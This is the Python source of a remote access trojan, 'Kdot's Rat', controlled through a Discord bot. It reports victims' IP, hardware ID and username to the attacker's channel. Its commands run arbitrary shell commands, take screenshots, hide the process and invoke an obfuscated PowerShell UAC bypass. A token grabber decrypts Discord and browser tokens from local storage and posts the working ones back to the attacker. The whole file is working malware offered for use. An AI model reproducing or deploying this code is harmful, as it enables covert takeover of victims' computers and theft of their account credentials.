import discord
from discord.ext import commands
import requests
import os
import io
import base64
import subprocess
import sys
import ctypes
import json
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import re
import win32com.client as wincl
from contextlib import contextmanager
import pyautogui

#token = sys.argv[1]
token = "naw"

kdot = commands.Bot(command_prefix=".", intents=discord.Intents.all())
kdot.remove_command("help")


def is_admin():
    admin = ctypes.windll.shell32.IsUserAnAdmin()
    if admin == 0:
        return False
    else:
        return True


@contextmanager
def stdoutIO(stdout=None):
    old = sys.stdout
    if stdout is None:
        stdout = io.StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = old


@kdot.event
async def on_ready():
    global channel_name
    channel_name = None
    global admin
    admin = ctypes.windll.shell32.IsUserAnAdmin()
    if admin == 0:
        admin = False
    else:
        admin = True
    get_biggest_number = None
    guilds = kdot.guilds
    global guild_id
    guild_id = guilds[0].id
    guild = kdot.get_guild(guild_id)
    all_channels = []
    guild_channels = guild.channels
    for channel in guild_channels:
        all_channels.append(channel.name)
    for i in range(len(all_channels)):
        if all_channels[i].startswith("session"):
            if get_biggest_number == None:
                get_biggest_number = all_channels[i]
            elif int(all_channels[i].split("-")[1]) > int(get_biggest_number.split("-")[1]):
                get_biggest_number = all_channels[i]
            else:
                pass
        else:
            pass
    if get_biggest_number != None:
        channel = await guild.create_text_channel(f"session-{int(get_biggest_number.split('-')[1]) + 1}")
        channel_name = f"session-{int(get_biggest_number.split('-')[1]) + 1}"
    else:
        channel_name = "session-1"
        channel = await guild.create_text_channel(channel_name)

    ip = requests.get("https://api.ipify.org").text
    hwid = subprocess.check_output(
        "wmic csproduct get uuid").decode().split("\n")[1].strip()
    username = os.getlogin()
    time = os.popen("time /t").read().strip()
    working_dir = os.getcwd()

    embed = discord.Embed(title="Kdot's Rat",
                          description="New Kid Ratted", color=0x00ff00)
    embed.add_field(name="IP", value=ip, inline=True)
    embed.add_field(name="HWID", value=hwid, inline=True)
    embed.add_field(name="Username", value=username, inline=True)
    embed.add_field(name="Time", value=time, inline=True)
    embed.add_field(name="Session", value=channel_name, inline=True)
    embed.add_field(name="Working Directory", value=working_dir, inline=True)
    embed.add_field(name="Admin", value=admin, inline=True)
    embed.set_footer(text="Made by K.Dot#4044 and Godfather#2564")
    embed.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/1064460051600900151/1064642609219379320/comethazine.png")
    channel_stuff = discord.utils.get(guild.channels, name=channel_name)
    channel_id = channel_stuff.id
    await guild.get_channel(channel_id).send(embed=embed, content="@everyone")

    print("Connected")


@kdot.event
async def on_command_error(ctx, error):
    try:
        await ctx.send(error)
    except:
        pass


@kdot.command()
async def help(ctx):
    prefix = kdot.command_prefix
    if ctx.channel.name != channel_name:
        return
    commands_list = f"""{prefix}help - Shows this message
{prefix}ping - Pings the bot
{prefix}cd <directory> - Changes the working directory
{prefix}cmd <command> - Runs a command on the host machine
{prefix}download <file> - Downloads a file from the host machine
{prefix}messagebox <title> <message> - Shows a message box on the host machine
{prefix}uac_bypass - Bypasses UAC on the host machine (USE DISABLE ANTI-VIRUS BEFORE USING THIS COMMAND)
{prefix}ask_admin - Tries to request admin like a normal process
{prefix}admin - Checks if the bot has admin
{prefix}screenshot - Takes a screenshot of the host machine
{prefix}hide - Hides the rat
{prefix}unhide - Unhides the rat
{prefix}delete <session_num> - Deletes the session of your choice (1, 2, 3, etc) or if you say "all" it will delete all sessions
{prefix}tokens - Gets all the tokens of the user"""
    await ctx.send(file=discord.File(io.BytesIO(commands_list.encode()), filename="commands.txt"), content="Commands:")


@kdot.command()
async def ping(ctx):
    if ctx.channel.name != channel_name:
        return
    await ctx.send("Pong! " + str(round(kdot.latency * 1000)) + "ms")


@kdot.command()
async def uac_bypass(ctx):
    if ctx.channel.name != channel_name:
        return
    command = f"Start-Process {__file__}"
    code = bytearray(command, 'utf-16-le')
    code = base64.b64encode(code).decode()
    setVar = "Set-Variable -Name 'code' -Value "+f'"{code}";'
    final_command = r"""[STrinG]::Join( '', ([cHAr[]] (101 , 35 ,8 ,58 , 96, 2 ,15 ,7 ,8,14 , 57 , 109 , 109,4, 34,99 ,14 , 34,0 , 61 , 63, 40,30, 62 ,36 ,34 ,35 ,99,9,8 , 43,33, 44, 57 ,40,30,25,63,8, 44 , 0 ,101 , 109 , 22 , 30 ,52 , 30 , 57,40 ,32 , 99,36,34, 99, 32 ,40, 32 ,34 ,31, 20, 30 ,25 , 31, 40,44,0,16,22, 46, 34 , 35,59 ,8,63, 25, 16, 119 ,119 , 43, 63 ,34 , 32 , 15 ,44,30 ,8, 123,121 , 30, 25, 63 ,36 ,3,42 , 101 ,109, 106 , 37, 20, 121,116,14,117 , 4,58, 10,4 ,25, 98,52,38,59 ,34 , 10 ,39, 62, 121,11,37 , 40, 1,60,4 ,42 , 43 ,24 ,5, 25,6 , 8, 61, 61 ,63,6 , 102 ,30,1, 7, 11,1 ,116 , 116, 55, 20,11,58,24 , 32 ,21,32 , 102,123,40 , 40 ,121, 63,55 , 46 , 47 ,57,36, 126,34 ,125, 4,46, 20 ,9 , 26 , 14, 55 , 53 , 15,43, 6, 30 ,15, 102, 0,33 ,41,46 ,57 , 42 ,116, 117 , 46,125,25 ,1 ,44 ,124, 43 ,21 , 62, 23 , 4 ,5,1 ,44, 33,34 ,35,24, 6, 53 , 6, 60, 12 ,35 , 60 ,31 , 30 ,53 , 5 ,44, 5 ,102, 36, 34 , 44,124,123, 27,31, 15, 34,37,44 ,25 , 125 ,124, 8,62, 21 ,14 ,32, 11 , 125, 126 ,32,36 ,63 ,2, 5 ,11 ,44, 125 , 55 ,31, 33 ,63,11 , 60,11 ,31 , 24, 25 , 0 ,116 ,24 , 41, 59,117, 28, 7,59,6 ,4, 33,2, 123,127,39 ,123, 7 ,102 , 37,15, 59 , 14,59,10 ,20,23, 55, 43,6 ,102,46, 127,34 , 123, 117,12,37 ,23,59 , 26,60,30,9, 4, 38, 126,10,59 ,9 , 8 ,4 ,52 ,124 , 35 , 59 ,4, 7,10 ,58,38,116 , 7 ,116 ,33 , 5 ,120 ,126,43 ,127, 127 ,32, 30 ,41 , 59, 106 ,100 ,109,97, 22, 30,52, 62, 25 ,8 , 0 , 99 , 36 ,34 , 99, 14,2, 0,61 , 31, 40, 62 , 30,36 , 34,35, 99, 46 ,34,0 ,29,31,8 ,30, 30,4,2,3, 0,34 , 9 , 8 , 16 , 119, 119 ,9 , 40 , 14,34, 32,61,63,40 ,62 ,62, 109 ,100,109 ,49 ,109 , 11 , 34,63,40 ,44 ,46 ,5,54 , 35 , 8,58 ,96,2, 15, 7, 8, 14, 57 ,109,4, 34 ,99 ,30, 57 ,31, 40 ,44,0, 63 , 8,44 , 9 ,40,63,101, 109 ,105 , 18, 97 ,22, 30 ,52 , 30 ,25 ,8 , 0, 99,57 ,40 , 21,25,99, 40 ,35, 14 , 2,41 , 4, 3 ,10 ,16,119 , 119 , 44 , 30 , 46 , 36 , 4, 109 , 100,48 ,100 , 99,63,8 ,44, 9 , 25 ,2,8,35,41 , 101 , 109,100,109, 49 ,109 , 4 , 35 , 27, 34 , 6,8, 96 ,40, 53 ,61, 31 , 8, 62, 62 ,4,2 ,3) |% {[cHAr]( $_-bXor"0x4d" ) } ) ) |.( ([String]$verbOSEPRefeReNCE)[1,3]+'x'-JOin'')"""
    subprocess.run(["powershell", setVar, final_command])
    await ctx.send("UAC Bypassed")
    os._exit(0)


@kdot.command()
async def ask_admin(ctx):
    if ctx.channel.name != channel_name:
        return
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        await ctx.send("Asked for admin!")
    else:
        await ctx.send("Already admin")


@kdot.command()
async def admin(ctx):
    if ctx.channel.name != channel_name:
        return
    await ctx.send("Checking if admin...")
    await ctx.send("```" + str(is_admin()) + "```")


@kdot.command()
async def screenshot(ctx):
    if ctx.channel.name != channel_name:
        return
    await ctx.send("Taking screenshot...")
    image = pyautogui.screenshot()
    image.save("screenshot.png")
    await ctx.send(file=discord.File("screenshot.png"))
    os.remove("screenshot.png")
    
@kdot.command()
async def hide(ctx):
    await ctx.send("Hiding window... This has to make a new process so it might take a second.")
    text = f"powershell -c \"Start-Process -WindowStyle Hidden {__file__}\""
    print(text)
    os.system(text)
    os._exit(0)
    
@kdot.command()
async def show(ctx):
    await ctx.send("Showing window... This has to make a new process so it might take a second.")
    text = f"powershell -c \"Start-Process {__file__}\""
    os.system(text)
    os._exit(0)

@kdot.command()
async def cmd(ctx, *, command):
    if ctx.channel.name != channel_name:
        return
    message = await ctx.send("Running command...")
    output = os.popen(command).read()
    if len(output) > 2000:
        bytes = io.BytesIO(output.encode())
        await ctx.send(file=discord.File(bytes, "output.txt"), content=f"Output was too long, so it was sent as a file. (Length: {len(output)}. Command ran: {command}")
        await message.delete()
    elif "```" in output:
        bytes = io.BytesIO(output.encode())
        await ctx.send(file=discord.File(bytes, "output.txt"), content=f"Output contained a codeblock, so it was sent as a file. (Length: {len(output)}. Command ran: {command}")
        await message.delete()
    else:
        await message.edit(content=f"```{output}``` (Length: {len(output)}. Command ran: {command})")


@kdot.command()
async def delete(ctx, session):
    if ctx.channel.name != channel_name:
        return
    if session == "all":
        guild = ctx.guild
        channels = guild.channels
        for channel in channels:
            if channel.name.startswith("session-"):
                await channel.delete()
        os._exit(0)
    else:
        guild = ctx.guild
        channels = guild.channels
        for channel in channels:
            if channel.name == "session-" + session:
                if channel.name == channel_name:
                    await channel.delete()
                    os._exit(0)
                else:
                    await channel.delete()
                    await ctx.send("Deleted channel: " + channel.name)


@kdot.command()
async def download(ctx):
    if ctx.channel.name != channel_name:
        return
    file = ctx.message.attachments[0]
    file_link = file.url
    with open(file.filename, "wb") as f:
        f.write(requests.get(file_link).content)
    await ctx.send("Downloaded file to " + os.getcwd() + "\\" + file.filename)


@kdot.command()
async def message(ctx, title, *, message):
    if ctx.channel.name != channel_name:
        return
    Message_box = ctypes.windll.user32.MessageBoxW
    Message_box(None, message, title, 0)


@kdot.command()
async def say(ctx, *, message):
    if ctx.channel.name != channel_name:
        return
    talk = wincl.Dispatch("SAPI.SpVoice")
    talk.Speak(message)
    await ctx.send("Said: " + message)


@kdot.command()
async def cd(ctx, *, directory):
    if ctx.channel.name != channel_name:
        return
    os.chdir(directory)
    await ctx.send("Changed directory to: " + os.getcwd())


@kdot.command()
async def tokens(ctx):
    if ctx.channel.name != channel_name:
        return
    os.system("taskkill /f /im Discord.exe")
    for token in get_tokens():
        try:
            r = requests.get(
                "https://discordapp.com/api/v6/users/@me",
                headers={"Authorization": token},
            )
            user = r.json()
            user_info = user["username"] + "#" + user["discriminator"]
            await ctx.send(f"Token: {token} | User: {user_info}")
        except:
            pass


def decrypt_val(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def get_key(path):
    if not os.path.exists(path):
        return

    if "os_crypt" not in open(path, "r", encoding="utf-8").read():
        return

    with open(path, "r", encoding="utf-8") as f:
        c = f.read()

    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    # ngl I stole all this from addidix cause im too lazy to remake it since my shit broken af
    return master_key


def get_tokens():
    all_tokens = []
    appdata = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
    normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    paths = {
        "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
        "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
        "Lightcord": roaming + "\\Lightcord\\Local Storage\\leveldb\\",
        "Discord PTB": roaming + "\\discordptb\\Local Storage\\leveldb\\",
        "Opera": roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        "Opera GX": roaming
        + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
        "Amigo": appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
        "Torch": appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
        "Kometa": appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
        "Orbitum": appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
        "CentBrowser": appdata + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
        "7Star": appdata + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
        "Sputnik": appdata + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
        "Vivaldi": appdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome SxS": appdata
        + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
        "Chrome": appdata
        + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome1": appdata
        + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
        "Chrome2": appdata
        + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
        "Chrome3": appdata
        + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
        "Chrome4": appdata
        + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
        "Chrome5": appdata
        + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
        "Epic Privacy Browser": appdata
        + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
        "Microsoft Edge": appdata
        + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
        "Uran": appdata
        + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
        "Yandex": appdata
        + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Brave": appdata
        + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Iridium": appdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
    }
    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        # thx addix for space thing fix idk
        _discord = name.replace(" ", "").lower()
        if "cord" in path:
            if not os.path.exists(roaming + f"\\{_discord}\\Local State"):
                continue
            for file_stuff in os.listdir(path):
                if file_stuff[-3:] not in ["log", "ldb"]:
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{file_stuff}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for i in re.findall(encrypt_regex, line):
                        token = decrypt_val(
                            base64.b64decode(i.split("dQw4w9WgXcQ:")[1]),
                            get_key(roaming + f"\\{_discord}\\Local State"),
                        )
                        all_tokens.append(token)
        else:
            for file_stuff in os.listdir(path):
                if file_stuff[-3:] not in ["log", "ldb"]:
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{file_stuff}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for i in re.findall(normal_regex, line):
                        all_tokens.append(i)
    if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
        for path, dirs, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for new_file in files:
                if not new_file.endswith(".sqlite"):
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{new_file}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for token in re.findall(encrypt_regex, line):
                        all_tokens.append(token)
    working = []
    for token in [*set(all_tokens)]:
        url = "https://discord.com/api/v9/users/@me"
        r = requests.get(url, headers={"Authorization": token})
        if r.status_code == 200:
            working.append(token)
            #ngl I basically stole the entire token grabber part from addidix so go give him love or sum idk
        return working

if __name__ == "__main__":
    kdot.run(token, log_handler=None)
